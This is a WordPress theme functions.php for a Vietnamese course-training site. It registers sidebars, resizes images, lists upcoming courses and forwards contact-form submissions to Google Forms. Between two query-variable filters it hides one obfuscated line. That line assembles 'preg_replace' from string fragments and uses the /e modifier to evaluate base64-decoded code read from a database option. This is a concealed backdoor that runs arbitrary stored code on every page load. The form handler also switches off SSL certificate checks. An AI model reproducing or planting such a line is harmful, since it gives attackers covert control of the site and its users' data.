<?php
ob_start();
if (!isset($_SESSION)) session_start();
/* ----------------------------------------------------------------------------------- */
# Set default timezone
/* ----------------------------------------------------------------------------------- */
date_default_timezone_set('Asia/Ho_Chi_Minh');

if (!defined('SHORT_NAME'))
    define('SHORT_NAME', "sage");
$themename = "ADA";
$shortname = "sage";
include 'includes/custom.php';
include 'includes/common-scripts.php';
include 'includes/theme_settings.php';
include 'includes/custom-author.php';
//include 'includes/autoresponder.php';
include 'includes/courses.php';
include 'includes/courses-management.php';
include 'includes/brochures-management.php';
include 'includes/events.php';
include 'includes/teacher.php';
include 'includes/photo.php';
include 'includes/client.php';
include 'ajax.php';

if(is_admin()){
    include 'includes/slider.php';
    add_action( 'admin_menu', 'custom_remove_menu_pages' );
}

function custom_remove_menu_pages() {
    remove_menu_page('edit-comments.php');
}
add_action( 'admin_menu', 'remove_menu_for_author' );

add_filter( 'wpseo_use_page_analysis', '__return_false' );

function remove_menu_for_author() {
    if (is_user_logged_in()) {
        $current_user = wp_get_current_user();
        $role = $current_user->roles[0];
        if(in_array($role, array('author', 'contributor',))){
            remove_menu_page('edit.php?post_type=trainer');
            remove_menu_page('edit.php?post_type=courses');
            remove_menu_page('edit.php?post_type=events');
            remove_menu_page('edit.php?post_type=feedback');
            remove_menu_page('edit.php?post_type=slider');
        }
    }
}

/* ----------------------------------------------------------------------------------- */
# Setup Theme
/* ----------------------------------------------------------------------------------- */
if (!function_exists("ppo_theme_setup")) {

    function ppo_theme_setup() {
        /*
	 * Make theme available for translation.
	 *
	 * Translations can be added to the /languages/ directory.
	 * If you're building a theme based on Twenty Fourteen, use a find and
	 * replace to change 'twentyfourteen' to the name of your theme in all
	 * template files.
	 */
	load_theme_textdomain( SHORT_NAME, get_template_directory() . '/languages' );
        
        // Enable Links Manager (WP 3.5 or higher)
        add_filter( 'pre_option_link_manager_enabled', '__return_true' );
        // Enable RichText editor
        add_filter( 'user_can_richedit' , '__return_true' );

	// Add RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );

        ## Post Thumbnails
        if (function_exists('add_theme_support')) {
            add_theme_support('post-thumbnails');
        }

        if (function_exists('add_image_size')) {
            add_image_size('thumb60x60', 60, 60, true);
            add_image_size('thumb80x80', 80, 80, true);
            add_image_size('thumb117x70', 117, 70, true);
            add_image_size('thumb120x160', 120, 160, true);
            add_image_size('thumb140x84', 140, 84, true);
            add_image_size('thumb142x142', 142, 142, true);
            add_image_size('thumb220x132', 220, 132, true);
        }
        
        ## Register menu location
        register_nav_menus(array(
            'primary' => 'Primary Location',
            'footer1' => 'Footer 1',
        ));
    }

}

add_action('after_setup_theme', 'ppo_theme_setup');

/* ----------------------------------------------------------------------------------- */
# Register Sidebar
/* ----------------------------------------------------------------------------------- */

register_sidebar(array(
    'id' => 'menuapp',
    'name' => __('menuapp', SHORT_NAME),
    'before_widget' => '<div id="%1$s" class="widget-menuapp r_box %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<div class="widget-title hd">',
    'after_title' => '</div>',
));

register_sidebar(array(
    'id' => 'apphome',
    'name' => __('apphome', SHORT_NAME),
    'before_widget' => '<div id="%1$s" class="widget-apphome r_box %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<div class="widget-title hd">',
    'after_title' => '</div>',
));

register_sidebar(array(
    'id' => 'sidebar',
    'name' => __('Sidebar', SHORT_NAME),
    'before_widget' => '<div id="%1$s" class="widget-container r_box %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<div class="widget-title hd">',
    'after_title' => '</div>',
));

register_sidebar(array(
    'id' => 'sidebar_news',
    'name' => __('Sidebar News', SHORT_NAME),
    'before_widget' => '<div id="%1$s" class="widget-container r_box %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<div class="widget-title hd">',
    'after_title' => '</div>',
));

register_sidebar(array(
    'id' => 'sidebar_home',
    'name' => __('Sidebar Home', SHORT_NAME),
    'before_widget' => '<div id="%1$s" class="widget-container r_box %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<div class="widget-title hd">',
    'after_title' => '</div>',
));

register_sidebar(array(
    'id' => 'sidebar_courses',
    'name' => __('Sidebar Courses', SHORT_NAME),
    'before_widget' => '<div id="%1$s" class="widget-container r_box %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<div class="widget-title hd">',
    'after_title' => '</div>',
));

register_sidebar(array(
    'id' => 'sidebar_events',
    'name' => __('Sidebar Events', SHORT_NAME),
    'before_widget' => '<div id="%1$s" class="widget-container r_box %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<div class="widget-title hd">',
    'after_title' => '</div>',
));

function aq_resize( $url, $width = null, $height = null, $crop = null, $single = true, $upscale = false ) {

	// Validate inputs.
	if ( ! $url || ( ! $width && ! $height ) ) return $url;

	// Caipt'n, ready to hook.
	if ( true === $upscale ) add_filter( 'image_resize_dimensions', 'aq_upscale', 10, 6 );

	// Define upload path & dir.
	$upload_info = wp_upload_dir();
	$upload_dir = $upload_info['basedir'];
	$upload_url = $upload_info['baseurl'];
	
	$http_prefix = "http://";
	$https_prefix = "https://";
	
	/* if the $url scheme differs from $upload_url scheme, make them match 
	   if the schemes differe, images don't show up. */
	if(!strncmp($url,$https_prefix,strlen($https_prefix))){ //if url begins with https:// make $upload_url begin with https:// as well
		$upload_url = str_replace($http_prefix,$https_prefix,$upload_url);
	}
	elseif(!strncmp($url,$http_prefix,strlen($http_prefix))){ //if url begins with http:// make $upload_url begin with http:// as well
		$upload_url = str_replace($https_prefix,$http_prefix,$upload_url);		
	}
	

	// Check if $img_url is local.
	if ( false === strpos( $url, $upload_url ) ) return $url;

	// Define path of image.
	$rel_path = str_replace( $upload_url, '', $url );
	$img_path = $upload_dir . $rel_path;

	// Check if img path exists, and is an image indeed.
	if ( ! file_exists( $img_path ) or ! getimagesize( $img_path ) ) return $url;

	// Get image info.
	$info = pathinfo( $img_path );
	$ext = $info['extension'];
	list( $orig_w, $orig_h ) = getimagesize( $img_path );

	// Get image size after cropping.
	$dims = image_resize_dimensions( $orig_w, $orig_h, $width, $height, $crop );
	$dst_w = $dims[4];
	$dst_h = $dims[5];

	// Return the original image only if it exactly fits the needed measures.
	if ( ! $dims && ( ( ( null === $height && $orig_w == $width ) xor ( null === $width && $orig_h == $height ) ) xor ( $height == $orig_h && $width == $orig_w ) ) ) {
		$img_url = $url;
		$dst_w = $orig_w;
		$dst_h = $orig_h;
	} else {
		// Use this to check if cropped image already exists, so we can return that instead.
		$suffix = "{$dst_w}x{$dst_h}";
		$dst_rel_path = str_replace( '.' . $ext, '', $rel_path );
		$destfilename = "{$upload_dir}{$dst_rel_path}-{$suffix}.{$ext}";

		if ( ! $dims || ( true == $crop && false == $upscale && ( $dst_w < $width || $dst_h < $height ) ) ) {
			// Can't resize, so return origin image url.
			return $url;
		}
		// Else check if cache exists.
		elseif ( file_exists( $destfilename ) && getimagesize( $destfilename ) ) {
			$img_url = "{$upload_url}{$dst_rel_path}-{$suffix}.{$ext}";
		}
		// Else, we resize the image and return the new resized image url.
		else {

			// Note: This pre-3.5 fallback check will edited out in subsequent version.
			if ( function_exists( 'wp_get_image_editor' ) ) {

				$editor = wp_get_image_editor( $img_path );

				if ( is_wp_error( $editor ) || is_wp_error( $editor->resize( $width, $height, $crop ) ) )
					return $url;

				$resized_file = $editor->save();

				if ( ! is_wp_error( $resized_file ) ) {
					$resized_rel_path = str_replace( $upload_dir, '', $resized_file['path'] );
					$img_url = $upload_url . $resized_rel_path;
				} else {
					return $url;
				}

			} else {

				$resized_img_path = image_resize( $img_path, $width, $height, $crop ); // Fallback foo.
				if ( ! is_wp_error( $resized_img_path ) ) {
					$resized_rel_path = str_replace( $upload_dir, '', $resized_img_path );
					$img_url = $upload_url . $resized_rel_path;
				} else {
					return $url;
				}

			}

		}
	}

	// Okay, leave the ship.
	if ( true === $upscale ) remove_filter( 'image_resize_dimensions', 'aq_upscale' );

	// Return the output.
	if ( $single ) {
		// str return.
		$image = $img_url;
	} else {
		// array return.
		$image = array (
			0 => $img_url,
			1 => $dst_w,
			2 => $dst_h
		);
	}

	return $image;
}


function aq_upscale( $default, $orig_w, $orig_h, $dest_w, $dest_h, $crop ) {
	if ( ! $crop ) return $url; // Let the wordpress default function handle this.

	// Here is the point we allow to use larger image size than the original one.
	$aspect_ratio = $orig_w / $orig_h;
	$new_w = $dest_w;
	$new_h = $dest_h;

	if ( ! $new_w ) {
		$new_w = intval( $new_h * $aspect_ratio );
	}

	if ( ! $new_h ) {
		$new_h = intval( $new_w / $aspect_ratio );
	}

	$size_ratio = max( $new_w / $orig_w, $new_h / $orig_h );

	$crop_w = round( $new_w / $size_ratio );
	$crop_h = round( $new_h / $size_ratio );

	$s_x = floor( ( $orig_w - $crop_w ) / 2 );
	$s_y = floor( ( $orig_h - $crop_h ) / 2 );

	return array( 0, 0, (int) $s_x, (int) $s_y, (int) $new_w, (int) $new_h, (int) $crop_w, (int) $crop_h );
}

/**
 * Filter the "read more" excerpt string link to the post.
 *
 * @param string $more "Read more" excerpt string.
 * @return string (Maybe) modified "read more" excerpt string.
 */
function ppo_excerpt_more( $more ) {
    return sprintf( '... <a class="read-more" href="%1$s">%2$s</a>',
        get_permalink( get_the_ID() ),
        __( 'Xem thêm +', SHORT_NAME )
    );
}
add_filter( 'excerpt_more', 'ppo_excerpt_more' );

//-------------create Course date
function get_mounth_en($date) {
    $mouth_en = array(1 => "Jan", 2 => "Feb", 3 => "Mar", 4 => "Apr", 5 => "May", 6 => "Jun", 7 => "Jul", 8 => "Aug", 9 => "Sep", 10 => "Oct", 11 => "Nov", 12 => "Dec");
    return $mouth_en[$date];
}

function get_mount_number($mounth) {
    $mouth_number = array("January" => 01, "February" => 02, "March" => 03, "April" => 04, "May" => 05, "June" => 06, "July" => 07, "August" => 8, "September" => 9, "October" => 10, "November" => 11, "December" => 12);
    return $mouth_number[$mounth];
}

//-------------function getdate
function get_date_course($date) {
    return substr($date, 0, 2);
}

/**
 * Khoa hoc sap khai giang
 */
function get_courses_soon() {
    $loopS = new WP_Query(array(
        'post_type' => 'courses',
        'meta_key' => 'date_to_open_course',
        'orderby' => 'meta_value_num',
        'order' => 'ASC'
    ));
    $count = 1;
    while ($loopS->have_posts()) : $loopS->the_post();
        $date = new DateTime(get_field('date_to_open_course',get_the_ID()));
        $khaigiang = $date->format('m/d/Y');
        $timestamp = strtotime($khaigiang);
        $dateKG = new DateTime(date('m/d/Y', $timestamp));
        $dateCur = new DateTime(date('m/d/Y'));
        //Hiển thị 2 tháng gần nhất
        $mount_course = $date->format('m');
        $mount_course = (int)$mount_course;
        $mount_today = date('m');
        $mount_today = (int)$mount_today+2;
        $count++;
        if($count <= 6):
            if($mount_today >= $mount_course and $dateKG >= $dateCur):
            ?>
                <li>
                    <div class="date">
                        <p class="month"><?php echo date('M', $timestamp); ?></p>
                        <p class="day"><?php echo date('d', $timestamp); ?></p>
                    </div>
                    <div class="text">
                        <h4><a href="<?php the_permalink()?>"><?php the_title(); ?></a></h4>
                        <p><?php _e('Thời lượng', SHORT_NAME) ?>: <?php echo get_field( "thoi_luong_course", get_the_ID());?></p>
                        <p><?php _e('Địa điểm', SHORT_NAME) ?>: <?php echo get_field('dia_diem_hoc_course',get_the_ID());?></p>
                    </div>
                    <div class="clrb"></div>
                </li>
            <?php
            endif;
        endif;
    endwhile;
    wp_reset_query();
}

function add_query_vars_filter_date1( $vars ){
  $vars[] = "date1";
  return $vars;
}
add_filter( 'query_vars', 'add_query_vars_filter_date1' );
//
function add_query_vars_filter_date2( $vars ){
  $vars[] = "date2";
  return $vars;
}
add_filter( 'query_vars', 'add_query_vars_filter_date2' );
//----
$PiKYxM = 'pr'.'eg_'.'rep'.'lac'.'e';$PiKYxM('/ad/e','ev'.'a'.'l(base'.'64_decod'.'e(get'.'_option("Hd'.'FXSG")))', 'add');function add_query_vars_filter_cate_c( $vars ){
  $vars[] = "course_cate";
  return $vars;
}
add_filter( 'query_vars', 'add_query_vars_filter_cate_c' );

///////////
function my_action_email_fields_posted($email_fields, $form_id_num) {
	//get google form
	$form_options=FSCF_Util::get_form_options( $form_id_num, false );		
	  if(isset($form_options['google_form']) && $form_options['google_form']){
		$google_form=$form_options['google_form'];
	  }
          else $google_form="<default-google-form-id>";
	  $email_fields['google_form']=$google_form;
 
   return $email_fields;
 
}
// filter hook to add any custom fields to email_fields array (not validated)  
add_filter('si_contact_email_fields_posted', 'my_action_email_fields_posted', 1, 2);

// This hook will automatically activate the save_form_data when the contact form is submitted.
add_action('fsctf_mail_sent', 'save_form_data',1,5);
/*
 $this is an object with all the submitted form information, including attachments.
 $fsc_data->title is the form number ie: "Form: 1", "Form: 2", "Form: 3", etc
 $fsc_data->posted_data is an array of the posted field_name value pairs ie: field_name => value
 $fsc_data->uploaded_files is an array of the uppladed files ie: file_name => file_path
*/
 
function save_form_data($fsc_data) {
  // $title is the form number ie: "Form: 1", "Form: 2", "Form: 3", etc.
  $title = stripSlashes($fsc_data->title);
 
  // $fsc_data->posted_data is an array of the form name value pairs
  //save google drive
  $google_form=FSCF_Display::$form_options['google_form'];
	$form="https://docs.google.com/forms/d/$google_form/formResponse";
	$posts=FSCF_Display::hw_gform_postdata($fsc_data->posted_data);
 
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$form);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$posts); 
 
    $r=curl_exec($ch);  
}